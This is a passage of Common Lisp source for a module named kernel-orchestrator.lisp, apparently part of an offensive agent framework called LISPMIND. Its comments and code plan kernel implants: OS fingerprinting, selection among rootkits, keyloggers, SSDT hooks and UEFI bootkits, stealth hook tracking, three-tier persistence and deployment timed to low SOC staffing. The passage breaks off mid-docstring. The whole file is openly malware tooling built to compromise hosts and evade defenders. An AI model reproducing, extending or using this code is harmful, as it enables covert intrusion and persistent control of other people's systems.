;;;; -*- Mode: Lisp; Syntax: ANSI-Common-Lisp; Base: 10 -*-
;;;
;;; SECURITY NOTE: Code Signing Verification
;;; ----------------------------------------------------------------------------
;;; This file (kernel-orchestrator.lisp) is part of a Curve25519-signed tarball.
;;; It MUST be loaded only after signature verification at startup. The
;;; verifying loader should check the Ed25519 signature of the tarball against
;;; the embedded public key before extracting and LOADing this file. Loading
;;; without verification exposes the swarm to supply-chain compromise.
;;;
;;; Expected verification flow at startup:
;;;   1. Read the signed tarball into memory
;;;   2. Verify the Curve25519/Ed25519 detached signature
;;;   3. Only if signature is valid, extract and (LOAD) this file
;;;   4. If signature fails, abort and alert the operator
;;;
;;; This prevents tampered kernel orchestrator code from being injected into
;;; the swarm's privileged execution path.
;;; ----------------------------------------------------------------------------
;;;
;;; KERNEL-ORCHESTRATOR.LISP -- Kernel-Level Agent Management for LISPMIND v2.5
;;;
;;; ============================================================================
;;;          KERNEL ARCHITECTURE -- HARDWARE-AS-SOFTWARE-DEPENDENCY
;;; ============================================================================
;;;
;;; This module extends LISPMIND's offensive capability from userland into the
;;; kernel -- the privileged execution domain of every operating system. It
;;; provides autonomous kernel implantation: fingerprinting targets, selecting
;;; optimal kernel-level tools, deploying implants (eBPF, LKM, drivers, UEFI
;;; firmware), tracking stealth state, and handling the critical kernel-denied
;;; back-off path.
;;;
;;; CORE PRINCIPLES (non-negotiable)
;;; --------------------------------
;;; 1. HARDWARE IS A SOFTWARE DEPENDENCY -- The swarm treats kernel memory,
;;;    system call tables, interrupt dispatch routines, and firmware flash as
;;;    addressable resources no different from userland memory. If it executes,
;;;    the swarm can reason about it.
;;;
;;; 2. THREE-TIER PERSISTENCE -- Every foothold establishes persistence at
;;;    three tiers: userland (cron/registry), kernel (eBPF/LKM/driver), and
;;;    firmware (UEFI/ACPI/SMM). Loss of any single tier does not compromise
;;;    the implant.
;;;
;;; 3. STEALTH-FIRST KERNEL OPS -- Every kernel implant includes active
;;;    stealth management: hook verification, byte-level integrity checking,
;;;    and cross-agent coordination to prevent hook collisions.
;;;
;;; 4. KERNEL-DENIED BACK-OFF -- If kernel deployment is denied (SMEP, SMAP,
;;;    Driver Signature Enforcement, Secure Boot), the system AUTOMATICALLY
;;;    backs off to userland persistence with zero retry loops. The host is
;;;    marked 'kernel-hardened' and userland ops continue seamlessly.
;;;
;;; 5. RUST FFI BRIDGE -- All actual kernel operations (memory reads/writes,
;;;    ioctl calls, eBPF loading, driver installation) go through a Rust FFI
;;;    bridge. Lisp manages strategy; Rust manages safety-critical execution.
;;;
;;; ARCHITECTURE OVERVIEW
;;; ---------------------
;;;   KERNEL-AGENT (subclass of TACTICAL-AGENT)
;;;   |-- implant-type       -- :ebpf :lkm :driver :uefi :bootkit
;;;   |-- target-os          -- :linux :windows :uefi :unknown
;;;   |-- target-pid         -- Process ID for injection targets
;;;   |-- stealth-state      -- Hash table: hook-id -> stealth-hook
;;;   |-- hook-count         -- Active hook counter
;;;   |-- kernel-denied-p    -- T if kernel load was denied
;;;   |-- fallback-tier      -- :userland :kernel :firmware
;;;   |-- memory-offset      -- Kernel address where implant lives
;;;   |-- last-health-check  -- Timestamp of last health verification
;;;
;;;   OS FINGERPRINTING ENGINE
;;;   |-- TTL analysis (Linux=64, Windows=128, *BSD=255)
;;;   |-- Port signature analysis (445/3389=Windows, 22/111=Linux)
;;;   |-- Banner analysis (SMB, SSH, HTTP headers)
;;;   \-- Target value scoring (0-100 based on centrality/services)
;;;
;;;   KERNEL TOOLCHAIN REGISTRY
;;;   |-- Linux eBPF (stealthiest): process-hider, file-hider, syscall-interceptor
;;;   |-- Linux LKM: rootkit-lkm, keylogger-lkm, module-hider
;;;   |-- Windows Driver: ssdt-hook, irp-hook, minifilter, process-injector
;;;   |-- UEFI: bootkit-uefi, smm-implant, acpi-rootkit
;;;   \-- Selection: os + target-value + stealth-requirements -> optimal tool
;;;
;;;   AGENT-TO-KERNEL PROTOCOL (Gossip Mesh)
;;;   |-- KERNEL-LOAD-REQUEST  -- packet requesting implant deployment
;;;   |-- KERNEL-LOAD-RESPONSE -- packet reporting deployment result
;;;   \-- Handles: authorization, OS verification, tool selection, deployment
;;;
;;;   STEALTH STATE REGISTRY
;;;   |-- STEALTH-HOOK struct: hook-id, type, target-function, bytes, risk
;;;   |-- Register/verify/remove hooks with integrity checking
;;;   |-- Broadcast stealth state to prevent cross-agent hook collisions
;;;   \-- Full stealth report generation
;;;
;;;   KERNEL-DENIED HANDLER
;;;   |-- Set kernel-denied-p = T
;;;   |-- Log kernel-denied event
;;;   |-- Back-off to fallback-tier (userland persistence)
;;;   |-- Mark host as 'kernel-hardened'
;;;   |-- Retry after configurable delay (some protections are temporary)
;;;   \-- Escalation when conditions change
;;;
;;;   HEALTH MONITORING
;;;   |-- Background thread checks implant health every N seconds
;;;   |-- Rust FFI call: check_health(implant_id)
;;;   |-- Verify all registered hooks
;;;   |-- Signal Recovery Manager on corruption/missing hooks
;;;   \-- Graceful start/stop lifecycle
;;;
;;; "The kernel is not a barrier. It is an API. The swarm speaks it fluently."
;;;
;;; ============================================================================

(in-package :lispmind)

;; ============================================================================
;; Section 0: Special Variables -- Kernel Orchestrator State
;; ============================================================================
;; Every special variable here controls a tuning knob for kernel-level
;; operations. Adjust based on operational tempo, defender maturity, and
;; acceptable risk tolerance. All times are in seconds unless noted.

(defvar *kernel-orchestrator-version* "2.5.0"
  "Version string for the kernel orchestrator module.

Used in gossip protocol negotiation and health report telemetry.
Format follows semantic versioning: MAJOR.MINOR.PATCH.
Major version changes indicate wire-protocol incompatibilities.")

(defvar *kernel-implant-registry* (make-hash-table :test 'eq :size 50)
  "Registry of all active kernel implants across all agents.

Keys are implant IDs (gensyms), values are KERNEL-AGENT instances that
own the implant. This is the central registry for the kernel layer --
every deployed implant, every hook, every memory offset is tracked here.

Thread-safety: Protected by *KERNEL-REGISTRY-LOCK*.

Populated by: HANDLE-KERNEL-LOAD-RESPONSE on :DEPLOYED status.
Cleaned by: REMOVE-KERNEL-IMPLANT and KERNEL-AGENT finalization.")

(defvar *kernel-registry-lock* (bt:make-lock "kernel-registry")
  "Lock protecting *KERNEL-IMPLANT-REGISTRY* from concurrent modification.

Acquired by:
  - register-kernel-implant   -- when adding a new kernel implant
  - deregister-kernel-implant -- when removing a kernel implant
  - list-kernel-implants      -- when enumerating all active implants
  - verify-kernel-implant     -- when checking implant health")

(defvar *kernel-hardened-hosts* (make-hash-table :test 'equal)
  "Set of hosts that have denied kernel-level access.

Keys are host IP addresses or hostnames (strings), values are plists
containing :denied-at timestamp, :reason string, and :retry-after timestamp.
These hosts are skipped for kernel operations unless explicitly retried
via RETRY-KERNEL-LOAD.

Thread-safety: Protected by *KERNEL-HARDENED-LOCK*.")

(defvar *kernel-hardened-lock* (bt:make-lock "kernel-hardened")
  "Lock protecting *KERNEL-HARDENED-HOSTS* from concurrent modification.")

(defvar *kernel-toolchain-registry* (make-hash-table :test 'eq :size 50)
  "Registry of kernel-level tools available for deployment.

Keys are tool-name symbols (e.g. 'PROCESS-HIDER, 'SSDT-HOOK),
values are KERNEL-TOOL-ENTRY structs. This is the swarm's kernel tool
selection brain -- every tool has OS compatibility, implant type,
stealth rating, complexity, risk level, and prerequisites.

Populated once at load time by LOAD-KERNEL-TOOLCHAIN-REGISTRY.
Thread-safety: Protected by *KERNEL-TOOLCHAIN-LOCK*.")

(defvar *kernel-toolchain-lock* (bt:make-lock "kernel-toolchain")
  "Lock protecting *KERNEL-TOOLCHAIN-REGISTRY* from concurrent modification.")

(defvar *kernel-stealth-registry* (make-hash-table :test 'eq :size 100)
  "Global registry of all active stealth hooks across all agents.

Keys are hook-id symbols, values are STEALTH-HOOK structs. This registry
enables cross-agent coordination -- before installing a hook, an agent
can check if another agent already has a hook at the same location.

Thread-safety: Protected by *KERNEL-STEALTH-LOCK*.")

(defvar *kernel-stealth-lock* (bt:make-lock "kernel-stealth")
  "Lock protecting *KERNEL-STEALTH-REGISTRY* from concurrent modification.")

(defvar *kernel-telemetry-topic* "swarm.kernel"
  "Gossip topic for kernel-level swarm events.

All kernel operations (deployment, removal, health check failures,
stealth state changes) publish to this topic. Other agents subscribe
to coordinate their own kernel operations and avoid conflicts.")

(defvar *kernel-health-monitor-interval* 10
  "Default interval in seconds between kernel health checks.

The health monitor thread wakes up every this-many seconds to verify
all registered implants and hooks. Lower values detect corruption faster
but increase forensic visibility. Higher values reduce noise but extend
the window of undetected compromise.

Rationale: 10 seconds balances responsiveness with stealth. In high-maturity
environments, increase to 30-60 seconds. During active operations, decrease
to 5 seconds.")

(defvar *kernel-max-retry-delay* 3600
  "Maximum retry delay in seconds after kernel denial.

RETRY-KERNEL-LOAD uses exponential backoff capped at this value.
The backoff sequence is: 300s, 600s, 1200s, 2400s, capped at 3600s.
This prevents infinite retry storms against permanently hardened hosts.")

(defvar *kernel-request-counter* 0
  "Monotonically increasing counter for kernel-load-request IDs.

Incremented atomically under *KERNEL-REQUEST-LOCK* to generate unique
request identifiers for the gossip protocol.")

(defvar *kernel-request-lock* (bt:make-lock "kernel-request")
  "Lock protecting *KERNEL-REQUEST-COUNTER*.")

(defvar *kernel-health-monitor-thread* nil
  "The health monitor background thread (a BT:THREAD instance) or NIL.

Spawned by START-KERNEL-HEALTH-MONITOR, joined by STOP-KERNEL-HEALTH-MONITOR.
This thread runs a loop that periodically checks all registered implants.
It is designed to be indestructible -- all errors are caught and logged.")

(defvar *kernel-health-monitor-running-p* nil
  "Is the kernel health monitor currently running?

Set to T by START-KERNEL-HEALTH-MONITOR before spawning the thread.
Set to NIL by STOP-KERNEL-HEALTH-MONITOR to signal graceful shutdown.
The health monitor loop checks this flag on each iteration.")

(defvar *kernel-rust-ffi-available-p* nil
  "Is the Rust FFI bridge available for kernel operations?

Set to T at load time if the Rust shared library can be loaded.
When NIL, all kernel operations are simulated (logged but not executed).
This allows the system to compile and run in degraded mode until the
Rust bridge is built and available.

To build the Rust bridge:
  cd rust-bridge && cargo build --release")

(defvar *kernel-fallback-methods*
  '(:userland-cron :userland-registry :userland-wmi
    :userland-schtasks :userland-service :userland-dll-hijack)
  "Ordered list of userland fallback persistence methods.

When kernel deployment is denied, these methods are tried in order
from stealthiest to noisiest. Each method corresponds to a userland
persistence mechanism that does not require kernel access.")

;; --- Security Hardening Special Variables ---

(defvar *code-signing-cert-path* nil
  "Path to a valid code signing certificate for driver signing.

When this is set to a non-NIL value (a pathname string), the kernel
orchestrator will prefer signed driver deployment over unsigned LKM
eBPF implants. Signed drivers present a significantly lower detection
profile on Windows systems with Driver Signature Enforcement (DSE).

The certificate should be a valid EV or standard code signing cert
in PKCS#12 format (.pfx/.p12). The password, if any, is stored
separately in *CODE-SIGNING-CERT-PASSWORD*.

Example:
  (setf *code-signing-cert-path* \"/secure/certs/ev-code-sign.p12\")")

(defvar *kernel-quiet-windows*
  '((:boot . t)
    (:hour . (2 3 4)))
  "Alist defining allowed deployment time windows.

Each element is a cons pair (window-type . specification):
  (:BOOT . T)        -- Allow deployment within 5 minutes of system boot
  (:HOUR . (h1 h2))  -- Allow deployment during specified hours (UTC)
  (:WEEKDAY . (d1))  -- Allow deployment on specified weekdays
  (:IDLE . minutes)  -- Require GUI idle time >= N minutes

The default allows deployment during early boot and during hours
2-4 AM UTC, when SOC staffing is minimal and audit log review is
unlikely. Adjust based on target environment's SOC operating hours.

To disable quiet windows (deploy anytime), set to NIL.
To restrict to boot-time only, set to '((:BOOT . T)).")

(defvar *kernel-implant-queue* '()
  "Queue of deferred implant deployments waiting for a quiet window.

Each element is a plist with:
  :TARGET      -- String, target host
  :IMPLANT-TYPE -- Keyword, desired implant type
  :TARGET-PID  -- Integer or NIL
  :NOISE-LEVEL -- Keyword
  :ENQUEUED-AT -- Timestamp

Deployments are queued when QUIET-WINDOW-ACTIVE-P returns NIL and
dequeued by SCHEDULE-IMPLANT-FOR-QUIET-WINDOW when the window opens.

Thread-safety: Protected by *KERNEL-IMPLANT-QUEUE-LOCK*.
Access via: SCHEDULE-IMPLANT-FOR-QUIET-WINDOW, PROCESS-IMPLANT-QUEUE.")

(defvar *kernel-implant-queue-lock* (bt:make-lock "kernel-implant-queue")
  "Lock protecting *KERNEL-IMPLANT-QUEUE* from concurrent modification.")

(defvar *kernel-auth-tpm-handle* nil
  "TPM NV index handle for the HMAC key, or NIL if not using TPM.

When non-NIL, this holds a 32-bit TPM NV index (e.g., #x01C10100)
that references the swarm's shared secret stored in TPM NVRAM.
The secret is never loaded into Lisp heap memory; all HMAC
operations are delegated to the TPM via /dev/tpmrm0.

Set by SET-KERNEL-AUTH-SECRET when called with a TPM handle.
Cleared by CLEAR-KERNEL-AUTH-SECRET with secure wipe.

Example:
  (set-kernel-auth-secret #x01C10100)  ; TPM NV index")

(defvar *kernel-auth-secret-derived* nil
  "The derived HMAC key material, or NIL if not yet derived.

This is set by DERIVE-HMAC-KEY-FROM-TPM after reading from TPM NVRAM
or falling back to hardware-bound derivation. It is a byte vector
containing the raw key material.

SECURITY: This is cleared by CLEAR-KERNEL-AUTH-SECRET using
FILL with random bytes before being set to NIL. Do not copy this
value -- use it directly in HMAC operations only.")

(defvar *kernel-auth-derivation-lock* (bt:make-lock "kernel-auth-derivation")
  "Lock protecting TPM key derivation to prevent race conditions.")

(defvar *kernel-tpm-device* "/dev/tpmrm0"
  "Path to the TPM resource manager device on Linux.

Used by DERIVE-HMAC-KEY-FROM-TPM to communicate with the TPM2 chip.
The resource manager (/dev/tpmrm0) handles session multiplexing
and is preferred over direct /dev/tpm0 access.

On Windows, this is ignored; the TPM is accessed via the TBS API.")

;; ============================================================================
;; Section 1: Kernel-Agent Base Class
;; ============================================================================
;; The KERNEL-AGENT is the swarm's unit of kernel-level offensive action.
;; Every host targeted for kernel implantation becomes a kernel-agent.
;; The agent manages the full lifecycle: OS fingerprinting, tool selection,
;; deployment, stealth tracking, health monitoring, and graceful back-off.
;;
;; Inheritance: KERNEL-AGENT -> TACTICAL-AGENT -> KALI-AGENT -> AGENT

(defclass kernel-agent (tactical-agent)
  ((implant-type :initarg :implant-type
                 :initform :ebpf
                 :accessor kernel-implant-type
                 :documentation
                 "The type of kernel implant this agent manages.
One of:
  :EBPF    -- Extended Berkeley Packet Filter (Linux, stealthiest)
  :LKM     -- Loadable Kernel Module (Linux, full-featured)
  :DRIVER  -- Windows kernel driver (SSDT hooks, IRP dispatch)
  :UEFI    -- UEFI firmware implant (persistent across OS reinstalls)
  :BOOTKIT -- Boot sector / MBR implant (pre-OS persistence)

Selection is automatic based on OS fingerprinting and target value,
but can be overridden by the operator for specific requirements.

Rationale: eBPF is the stealthiest because it uses official kernel APIs
and leaves minimal forensic traces. LKM is more capable but louder.
Drivers are required for Windows. UEFI/bootkit are for strategic assets.")

   (target-os :initarg :target-os
              :initform :unknown
              :accessor kernel-target-os
              :documentation
              "The operating system of the target host.
Set by FINGERPRINT-HOST-OSS during the targeting phase.
One of:
  :LINUX    -- Linux (any distribution)
  :WINDOWS  -- Windows (7/8/10/11/Server)
  :UEFI     -- Bare-metal UEFI firmware target
  :UNKNOWN  -- Could not determine OS (fingerprinting failed)

This drives tool selection: Linux gets eBPF/LKM, Windows gets drivers,
UEFI gets firmware implants. :UNKNOWN triggers more aggressive
fingerprinting before any deployment attempt.")

   (target-pid :initarg :target-pid
               :initform nil
               :accessor kernel-target-pid
               :documentation
               "Target process ID for process-specific injection.

When the implant type requires attaching to a specific process
(e.g., APC injection, process hollowing, eBPF tracepoint on a
specific PID), this slot holds the target PID.

NIL means the implant is system-wide (applies to all processes).
Set during the targeting phase based on process enumeration.")

   (stealth-state :initform (make-hash-table :test 'eq)
                  :accessor kernel-stealth-state
                  :documentation
                  "Registry of active hooks for this agent.

A hash table mapping hook-id (symbol) -> STEALTH-HOOK struct.
Each entry tracks a single kernel hook: its type, target function,
original bytes, current bytes, detection risk, and health status.

This is the agent's private stealth registry. A global registry
(*KERNEL-STEALTH-REGISTRY*) aggregates across all agents for
cross-agent coordination.")

   (hook-count :initform 0
               :accessor kernel-hook-count
               :documentation
               "Number of active hooks this agent has installed.

Incremented by REGISTER-STEALTH-HOOK, decremented by REMOVE-STEALTH-HOOK.
This is a fast cache for (hash-table-count (kernel-stealth-state agent))
but is maintained separately for thread-safe reads without locking.

A hook-count of 0 means no hooks are currently active.")

   (kernel-denied-p :initform nil
                    :accessor kernel-denied-p
                    :documentation
                    "Set to T if kernel load was denied on this host.

When kernel deployment fails due to protections (SMEP, SMAP, DSE,
Secure Boot, SELinux enforcing, AppArmor), this flag is set to T
and the agent automatically backs off to userland persistence.

Once set, the agent will not attempt further kernel operations
unless explicitly retried via RETRY-KERNEL-LOAD. The host is also
added to *KERNEL-HARDENED-HOSTS* for swarm-wide coordination.")

   (fallback-tier :initarg :fallback-tier
                  :initform :userland
                  :accessor kernel-fallback-tier
                  :documentation
                  "The persistence tier to fall back to on kernel denial.
One of:
  :USERLAND -- Fall back to userland persistence (cron, registry, WMI)
  :KERNEL   -- Retry with different kernel technique (same tier)
  :FIRMWARE -- Skip kernel, go directly to firmware/bootkit

Default is :USERLAND because it is the safest and stealthiest back-off.
:KERNEL is used when the denial is technique-specific (e.g., eBPF blocked
but LKM might work). :FIRMWARE is used for strategic assets where
persistence must survive OS reinstallation.")

   (memory-offset :initform nil
                  :accessor kernel-memory-offset
                  :documentation
                  "Kernel memory offset where the implant lives.

Set after successful deployment by the Rust FFI bridge. This is the
physical or virtual address (depending on implant type) where the
implant code resides in kernel space.

NIL means no implant is currently deployed. This slot is updated
by HANDLE-KERNEL-LOAD-RESPONSE on :DEPLOYED status.")

   (last-health-check :initform nil
                      :accessor kernel-last-health-check
                      :documentation
                      "Timestamp of the last successful health check.

A LOCAL-TIME:TIMESTAMP instance set by KERNEL-HEALTH-CHECK after
verifying all hooks and implant integrity. NIL means no health check
has been performed yet.

Used by the health monitor to detect stale implants. If the time
since last-health-check exceeds (* 3 *kernel-health-monitor-interval*),
Recovery Manager is signaled.")

   (implant-id :initform nil
               :accessor kernel-implant-id
               :documentation
               "Unique identifier for the deployed implant.

A gensym generated at deployment time. Used to reference the implant
in the Rust FFI bridge (check_health, remove_implant) and in the
global *KERNEL-IMPLANT-REGISTRY*.

NIL means no implant is currently deployed. Set by
HANDLE-KERNEL-LOAD-RESPONSE on successful deployment.")

   (health-status :initform :unknown
                  :accessor kernel-health-status
                  :documentation
                  "Current health status of the kernel implant.
One of:
  :UNKNOWN   -- No health check performed yet
  :HEALTHY   -- All hooks verified, implant responding
  :DEGRADED  -- Some hooks corrupt but implant functional
  :CRITICAL  -- Implant non-functional or hooks missing
  :RECOVERED -- Was critical but Recovery Manager restored it

Transitions:
  :UNKNOWN -> :HEALTHY  (first successful health check)
  :HEALTHY -> :DEGRADED (some hooks corrupt)
  :HEALTHY -> :CRITICAL (implant non-functional)
  :DEGRADED -> :HEALTHY (hooks restored)
  :CRITICAL -> :RECOVERED (Recovery Manager intervention)
  :RECOVERED -> :HEALTHY (stabilized after recovery)"))

  (:documentation
   "A kernel-agent manages kernel-level implants (eBPF, LKM, drivers, UEFI).

It handles OS fingerprinting, tool selection, deployment, and stealth tracking.
On kernel-denied, it automatically backs off to userland persistence.

The kernel-agent is the swarm's interface to ring-0. It manages:
  - OS fingerprinting: determines target OS via TTL, ports, banners
  - Tool selection: picks optimal kernel tool from registry
  - Deployment: sends kernel-load-request over gossip mesh
  - Stealth tracking: registers and verifies all hooks
  - Health monitoring: periodic integrity verification
  - Back-off: graceful fallback on kernel denial

Lifecycle:
  1. Created by MAKE-KERNEL-AGENT for a target host
  2. FINGERPRINT-HOST-OS determines target-os
  3. CALCULATE-TARGET-VALUE scores the host
  4. DETERMINE-IMPLANT-TYPE selects implant type
  5. SELECT-KERNEL-TOOL picks specific tool from registry
  6. SEND-KERNEL-LOAD-REQUEST initiates deployment
  7. On :DEPLOYED -> register stealth state, start health monitor
  8. On :DENIED -> handle-kernel-denied (back-off to userland)
  9. On :FAILED -> retry with different tool or escalate
  10. Continuous health monitoring via KERNEL-HEALTH-CHECK
  11. Removal via REMOVE-KERNEL-IMPLANT (restore original bytes)

Thread-safety: All slot modifications are thread-safe. STEALTH-STATE
is a private hash table (one per agent) requiring no external locking.
Other slots are modified only by the agent's own thread or the health
monitor thread (serial access)."))


(defun make-kernel-agent (target-host &key (pivot-depth 0)
                                             (entry-vector nil)
                                             (noise-level :silent)
                                             (proxy-chain '())
                                             (implant-type :ebpf)
                                             (target-os :unknown)
                                             (target-pid nil)
                                             (fallback-tier :userland))
  "Create a new KERNEL-AGENT for a target host.

This is the primary constructor for kernel-level agents. It extends
MAKE-TACTICAL-AGENT with kernel-specific slots and registers the agent
in the kernel implant registry.

Parameters:
  TARGET-HOST   -- String, IP address or hostname of the target.
  :PIVOT-DEPTH  -- Integer, how many hops from initial entry (default 0).
  :ENTRY-VECTOR -- Keyword, how access was gained (default NIL).
  :NOISE-LEVEL  -- Keyword, :silent :low :medium :high (default :silent).
  :PROXY-CHAIN  -- List of (protocol . addr) for proxy routing.
  :IMPLANT-TYPE -- Keyword, :ebpf :lkm :driver :uefi :bootkit (default :ebpf).
  :TARGET-OS    -- Keyword, :linux :windows :uefi :unknown (default :unknown).
  :TARGET-PID   -- Integer or NIL, target process ID (default NIL).
  :FALLBACK-TIER -- Keyword, :userland :kernel :firmware (default :userland).

Returns: The newly created KERNEL-AGENT instance.

Thread-safety: Acquires *KERNEL-REQUEST-LOCK* for ID generation and
*KERNEL-REGISTRY-LOCK* for registration.

Example:
  (make-kernel-agent \"192.168.1.100\" :target-os :linux :implant-type :ebpf)"
  (let* ((session-token (bt:with-lock-held (*kernel-request-lock*)
                          (incf *kernel-request-counter*)
                          (gensym (format nil "KERNEL-~D-" *kernel-request-counter*))))
         (agent (make-instance 'kernel-agent
                               :target-host target-host
                               :pivot-depth pivot-depth
                               :entry-vector entry-vector
                               :noise-level noise-level
                               :proxy-chain proxy-chain
                               :implant-type implant-type
                               :target-os target-os
                               :target-pid target-pid
                               :fallback-tier fallback-tier
                               :session-token session-token)))
    ;; Register in kernel implant registry
    (bt:with-lock-held (*kernel-registry-lock*)
      (setf (gethash session-token *kernel-implant-registry*) agent))
    ;; Publish agent creation event
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :kernel-agent-created
                      :session ,session-token
                      :target ,target-host
                      :os ,target-os
                      :implant-type ,implant-type
                      :pivot-depth ,pivot-depth))
    agent))


;; ============================================================================
;; Section 2: OS Fingerprinting Engine
;; ============================================================================
;; Before deploying any kernel implant, we must know the target OS with
;; high confidence. Wrong-OS deployment is the #1 cause of kernel implant
;; failure and detection. This engine uses passive fingerprinting techniques
;; that leave minimal forensic traces.
;;
;; Fingerprinting Methods (in order of reliability):
;;   1. ICMP TTL analysis      -- fast, stealthy, ~90% accurate
;;   2. TCP port signatures    -- service-specific, ~95% accurate
;;   3. Banner analysis        -- definitive when available
;;   4. HTTP header analysis   -- supplementary for web services

(defun fingerprint-host-os (target)
  "Fingerprint the target OS using passive network analysis.

This function performs multi-method OS fingerprinting without sending
any data to the target beyond normal network probes. It combines four
independent signals for high-confidence identification.

Fingerprinting Methods:
  1. ICMP TTL Analysis (stealthiest):
     - Linux typically uses TTL=64 (kernel default net.ipv4.ip_default_ttl)
     - Windows typically uses TTL=128
     - *BSD and Solaris typically use TTL=255
     - Intermediate hops decrement TTL, so we add hop-count back
     - Accuracy: ~90% for Linux/Windows, ~70% for *BSD

  2. TCP Port Signature Analysis:
     - Windows: ports 445 (SMB), 3389 (RDP), 5985 (WinRM)
     - Linux: ports 22 (SSH), 111 (RPCbind), 2049 (NFS)
     - Accuracy: ~95% when characteristic ports are open

  3. SMB Banner Analysis (if port 445 open):
     - Windows: Negotiate Protocol Response with specific dialects
     - Linux (Samba): Different dialect string, version in banner
     - Accuracy: ~99% (near-definitive)

  4. SSH Banner Analysis (if port 22 open):
     - OpenSSH on Linux: \"SSH-2.0-OpenSSH_X.X\"
     - Windows SSH: \"SSH-2.0-OpenSSH_for_Windows_X.X\"
     - Dropbear (embedded Linux): \"SSH-2.0-dropbear_X.X\"
     - Accuracy: ~95% (distinguishes Linux from Windows SSH)

  5. HTTP Server Header (if web ports open):
     - Windows: IIS headers, ASP.NET version cookies
     - Linux: Apache, Nginx, lighttpd headers
     - Accuracy: ~80% (many servers hide or modify headers)

Parameters:
  TARGET -- String, IP address or hostname to fingerprint.

Returns: One of :LINUX :WINDOWS :UEFI :UNKNOWN

The return value is determined by weighted voting across all methods.
Each method returns a confidence score (0.0-1.0) and OS guess. The
function aggregates scores per OS and returns the highest-scoring OS
that exceeds the minimum confidence threshold (0.6).

If no OS exceeds the threshold, returns :UNKNOWN -- this triggers
more aggressive fingerprinting before any deployment.

Thread-safety: This function is stateless and thread-safe. Multiple
threads can fingerprint different targets concurrently.

Example:
  (fingerprint-host-os \"192.168.1.100\")
    ;; => :LINUX (with 0.92 confidence)

  (fingerprint-host-os \"10.0.0.5\")
    ;; => :WINDOWS (with 0.97 confidence)"
  (let ((scores (list :linux 0.0 :windows 0.0 :uefi 0.0 :unknown 0.0))
        (methods-tried 0))
    ;; Method 1: ICMP TTL analysis
    (handler-case
        (let ((ttl (probe-ttl target)))
          (incf methods-tried)
          (when ttl
            (cond
              ;; Linux default TTL = 64 (with some variance for hops)
              ((<= 48 ttl 80)
               (incf (getf scores :linux) 0.9))
              ;; Windows default TTL = 128
              ((<= 100 ttl 150)
               (incf (getf scores :windows) 0.9))
              ;; *BSD/Solaris default TTL = 255
              ((> ttl 200)
               (incf (getf scores :linux) 0.3)  ; could be Linux behind many hops
               (incf (getf scores :unknown) 0.5)))))
      (error (e)
        (format *trace-output* "~&[KERNEL] TTL probe failed for ~A: ~A~%" target e)))
    ;; Method 2: TCP port signature analysis
    (handler-case
        (let ((open-ports (probe-open-ports target)))
          (incf methods-tried)
          (when open-ports
            (let ((has-windows-ports (or (member 445 open-ports)
                                         (member 3389 open-ports)
                                         (member 5985 open-ports)
                                         (member 593 open-ports)))
                  (has-linux-ports (or (member 22 open-ports)
                                       (member 111 open-ports)
                                       (member 2049 open-ports))))
              (cond
                ((and has-windows-ports (not has-linux-ports))
                 (incf (getf scores :windows) 0.95))
                ((and has-linux-ports (not has-windows-ports))
                 (incf (getf scores :linux) 0.95))
                ;; Both present -- could be dual-boot or misidentified
                ((and has-windows-ports has-linux-ports)
                 (incf (getf scores :windows) 0.5)
                 (incf (getf scores :linux) 0.5))))))
      (error (e)
        (format *trace-output* "~&[KERNEL] Port scan failed for ~A: ~A~%" target e)))
    ;; Method 3: SMB banner analysis (if port 445 is open)
    (handler-case
        (let ((smb-banner (probe-smb-banner target)))
          (when smb-banner
            (incf methods-tried)
            (cond
              ;; Windows native SMB
              ((and (search "NT LM" smb-banner)
                    (not (search "Samba" smb-banner)))
               (incf (getf scores :windows) 0.99))
              ;; Samba on Linux
              ((search "Samba" smb-banner)
               (incf (getf scores :linux) 0.99))
              ;; SMBv3 with encryption (Windows 10+/Server 2016+)
              ((search "SMB 3" smb-banner)
               (incf (getf scores :windows) 0.85)))))
      (error (e)
        (format *trace-output* "~&[KERNEL] SMB banner probe failed for ~A: ~A~%" target e)))
    ;; Method 4: SSH banner analysis (if port 22 is open)
    (handler-case
        (let ((ssh-banner (probe-ssh-banner target)))
          (when ssh-banner
            (incf methods-tried)
            (cond
              ;; OpenSSH on Linux/Unix
              ((search "OpenSSH" ssh-banner)
               (if (search "Windows" ssh-banner)
                   (incf (getf scores :windows) 0.9)
                   (incf (getf scores :linux) 0.9)))
              ;; Dropbear (embedded Linux, routers)
              ((search "dropbear" ssh-banner)
               (incf (getf scores :linux) 0.85)))))
      (error (e)
        (format *trace-output* "~&[KERNEL] SSH banner probe failed for ~A: ~A~%" target e)))
    ;; Method 5: HTTP header analysis (if web ports open)
    (handler-case
        (let ((http-server (probe-http-header target)))
          (when http-server
            (incf methods-tried)
            (cond
              ;; IIS on Windows
              ((search "Microsoft-IIS" http-server)
               (incf (getf scores :windows) 0.8))
              ;; Apache on Linux (usually)
              ((search "Apache" http-server)
               (incf (getf scores :linux) 0.7))
              ;; Nginx on Linux (usually)
              ((search "nginx" http-server)
               (incf (getf scores :linux) 0.6))
              ;; ASP.NET (Windows)
              ((search "ASP.NET" http-server)
               (incf (getf scores :windows) 0.85)))))
      (error (e)
        (format *trace-output* "~&[KERNEL] HTTP probe failed for ~A: ~A~%" target e)))
    ;; Aggregate results
    (if (zerop methods-tried)
        :unknown
        (let ((best-os :unknown)
              (best-score 0.0))
          (doplist (os score scores)
            (when (> score best-score)
              (setf best-os os
                    best-score score)))
          ;; Log fingerprinting result
          (gossip-publish *kernel-telemetry-topic*
                          `(:event :os-fingerprint
                            :target ,target
                            :os ,best-os
                            :confidence ,best-score
                            :methods ,methods-tried))
          best-os))))


(defun determine-implant-type (os target-value)
  "Determine the best kernel implant type for the target OS and value.

This function implements the swarm's kernel implant selection strategy.
It balances stealth (primary), capability (secondary), and target value
(tertiary) to choose the optimal implant type.

Selection Strategy:
  - Linux (target-value >= 70):    eBPF (stealthiest) if available
  - Linux (target-value < 70):     LKM (more capable, less stealthy)
  - Windows (target-value >= 80):  Driver (full kernel control)
  - Windows (target-value < 80):   eBPF if available (Windows eBPF is limited)
  - UEFI (any value):              Firmware implant (strategic asset)
  - :UNKNOWN:                      NIL (do not deploy without OS knowledge)

Rationale:
  eBPF is the stealthiest Linux implant because it uses official kernel
  APIs, requires no module loading, and leaves minimal forensic traces.
  eBPF programs appear as legitimate tracing or networking tools.

  LKM provides full kernel access (arbitrary memory read/write, system
  call table modification) but is louder: lsmod shows loaded modules,
  /proc/modules is inspectable, and module loading generates audit events.

  Windows drivers require code signing (unless DSE is disabled) but
